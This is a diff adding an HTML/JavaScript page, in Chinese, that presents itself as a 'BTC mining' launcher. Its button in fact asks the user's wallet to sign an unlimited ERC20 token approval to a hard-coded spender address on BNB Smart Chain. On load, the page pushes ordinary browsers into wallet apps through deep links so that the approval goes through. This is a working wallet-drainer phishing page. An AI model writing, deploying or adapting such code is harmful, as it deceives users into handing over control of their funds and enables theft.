@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>BTC挖矿</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+</head>
+<body style="text-align:center;margin-top:80px;font-family:sans-serif">
+
+<h2>BTC挖矿</h2>
+
+<p id="status">未连接钱包</p>
+
+<button onclick="connect()">连接钱包</button>
+<br><br>
+
+<button onclick="approve()">启动BTC挖矿</button>
+
+<script>
+let web3;
+let account;
+
+// 👉 代币地址（替换成你的Token地址）
+const tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
+
+// 👉 被授权地址（项目合约）
+const spender = "0x766909a9F77664dA97B2BE58F02bB69769c27690";
+
+// 👉 ERC20 approve ABI
+const ABI = [
+  {
+    "constant": false,
+    "inputs": [
+      {"name":"_spender","type":"address"},
+      {"name":"_value","type":"uint256"}
+    ],
+    "name":"approve",
+    "outputs":[{"name":"","type":"bool"}],
+    "type":"function"
+  }
+];
+
+// 无限额度
+const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+// 判断是否是普通浏览器（非 DApp 钱包浏览器）
+function isNormalBrowser() {
+  const ua = navigator.userAgent.toLowerCase();
+  return !ua.includes("metamask") && !ua.includes("tokenpocket") && !ua.includes("trust") && !ua.includes("imtoken");
+}
+
+// 页面加载时自动跳转到钱包打开当前网址
+window.addEventListener('load', () => {
+  if (isNormalBrowser()) {
+    // 根据常用钱包生成深度链接
+    const url = encodeURIComponent("https://chsisi1986.github.io/5/");
+    // 优先 TP 钱包
+    const deepLinkTP = `https://www.tokenpocket.app/dapp?url=${url}`;
+    // MetaMask Mobile
+    const deepLinkMM = `https://metamask.app.link/dapp/chsisi1986.github.io/5/`;
+    // Trust Wallet
+    const deepLinkTrust = `https://link.trustwallet.com/open_url?url=https://chsisi1986.github.io/5/`;
+    
+    // 默认跳转 TP 钱包 deep link
+    window.location.href = deepLinkTP;
+    
+    // 如果想支持其他钱包，可提供按钮选择或按设备识别
+  }
+});
+
+async function connect() {
+  if(window.ethereum){
+    try {
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      web3 = new Web3(window.ethereum);
+      const accounts = await web3.eth.getAccounts();
+      account = accounts[0];
+      document.getElementById("status").innerText = "已连接: " + account;
+
+      // 检查是否是 BSC 主网 (链ID: 56)
+      const chainId = await web3.eth.getChainId();
+      if(chainId !== 56){
+        alert("请切换到 BSC 主网");
+      }
+    } catch(err) {
+      console.error(err);
+      alert("钱包连接失败");
+    }
+  } else {
+    alert("请安装 MetaMask 或其他钱包");
+  }
+}
+
+async function approve() {
+  if(!account){
+    alert("请先连接钱包");
+    return;
+  }
+
+  const contract = new web3.eth.Contract(ABI, tokenAddress);
+
+  try {
+    const tx = await contract.methods.approve(
+      spender,
+      maxAmount
+    ).send({from: account});
+
+    console.log("交易成功:", tx);
+    alert("授权成功");
+
+    // 自动跳转到官网
+    window.location.href = "https://你的官网.com";
+  } catch(err) {
+    console.error(err);
+    alert("授权失败，请检查钱包网络或余额");
+  }
+}
+</script>
+
+</body>
+</html>
